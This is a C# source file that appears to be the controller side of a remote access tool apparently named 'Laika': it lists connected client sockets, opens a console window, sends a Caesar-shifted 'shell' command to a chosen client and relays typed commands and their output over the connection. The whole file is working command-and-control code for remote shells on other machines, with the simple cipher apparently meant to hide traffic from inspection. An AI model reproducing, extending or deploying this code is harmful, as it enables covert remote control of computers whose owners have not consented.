using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Server
{
    public static class Shell
    {
        public static bool OPENED = false;
        public static void ClearSocketData(TcpClient client)
        {
            try
            {
                if (client.Connected)
                {
                    NetworkStream stream = client.GetStream();

                    stream.Flush();

                    while (client.Available > 0)
                    {
                        byte[] buffer = new byte[client.Available];
                        stream.Read(buffer, 0, buffer.Length);
                    }
                }
            }
            catch { }
        }
        public static async void StartShell()
        {
            OPENED = true;

            Form shell = new Form
            {
                Text = "Shell",
                Size = new Size(800, 450),
                BackColor = Color.Black,
                FormBorderStyle = FormBorderStyle.FixedSingle,
                MaximizeBox = false,
                StartPosition = FormStartPosition.CenterScreen
            };
            System.Windows.Forms.TextBox textBox = new System.Windows.Forms.TextBox
            {
                Multiline = true,
                Dock = DockStyle.Fill,
                BackColor = Color.Black,
                ForeColor = Color.White,
                BorderStyle = BorderStyle.None,
                Font = new Font("Consolas", 12),
                ScrollBars = ScrollBars.Vertical
            };
            shell.Controls.Add(textBox);
            TcpClient c = Menu.CONNECT_CLIENTS[Menu.CLIENT_ID];
            c.Client.Blocking = true;
            ClearSocketData(c);
            shell.FormClosing += (sender, e) => OnFormClosing(e, c);
            textBox.KeyDown += (sender, e) => OnKeyDown(e, textBox, c);
            shell.Show();

            try
            {
                await Task.Run(async () =>
                {
                    try
                    {
                        NetworkStream stream = c.GetStream();
                        byte[] message = Encoding.UTF8.GetBytes(Utils.CAESAR("shell"));
                        stream.Write(message, 0, message.Length);
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                        {
                            string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            if (receivedData == "fail")
                            {
                                shell.Invoke((Action)(() => MessageBox.Show("fail")));
                                break;
                            }
                            receivedData = Utils.CAESAR_DECRYPT(receivedData);
                            if (receivedData.Contains("Laika: session ended"))
                            {
                                break;
                            }
                            shell.Invoke((Action)(() =>
                            {
                                textBox.AppendText(receivedData);
                                textBox.ScrollToCaret();
                            }));
                        }
                    }
                    catch
                    {
                    }
                });
            }
            finally
            {
                ClearSocketData(c);
                if (shell != null)
                {
                    shell.Close();
                    shell.Dispose();
                }
            }
            OPENED = false;
        }

        private static void OnFormClosing(FormClosingEventArgs e, TcpClient c)
        {
            try
            {
                NetworkStream stream = c.GetStream();
                byte[] message = Encoding.UTF8.GetBytes(Utils.CAESAR("exit\n"));
                stream.Write(message, 0, message.Length);
                ClearSocketData(c);
            }
            catch { }
            OPENED = false;
        }

        private static async void OnKeyDown(KeyEventArgs e, System.Windows.Forms.TextBox textBox, TcpClient client)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true; // Prevent the beep sound on Enter key
                string input = textBox.Text.Split(new[] { ">" }, StringSplitOptions.None).Last();
                try
                {
                    NetworkStream stream = client.GetStream();
                    byte[] message = Encoding.UTF8.GetBytes(Utils.CAESAR(input + "\n"));
                    await stream.WriteAsync(message, 0, message.Length);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error sending message: " + ex.Message);
                }

                textBox.AppendText(Environment.NewLine); // Move to the next line after pressing Enter
            }
        }
    }
    public static class Utils
    {
        private const int KEY = 5;
        public static string CAESAR_DECRYPT(string input)
        {
            char[] result = new char[input.Length];

            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];
                result[i] = (char)((int)c - KEY);
            }

            return new string(result);
        }
        public static string CAESAR(string input)
        {
            char[] result = new char[input.Length];

            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];
                result[i] = (char)((int)c + KEY);
            }

            return new string(result);
        }
    }
    internal static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.SetCompatibleTextRenderingDefault(false);
            Application.EnableVisualStyles();

            Menu.ServerStart();
            Menu m = new Menu();
            Thread t = new Thread(m.on_new_client);
            Thread t2 = new Thread(m.on_close_socket);

            t.Start();
            t2.Start();

            Application.Run(m);
            Menu.ServerStop();

            t.Abort();
            t2.Abort();
        }
    }
}
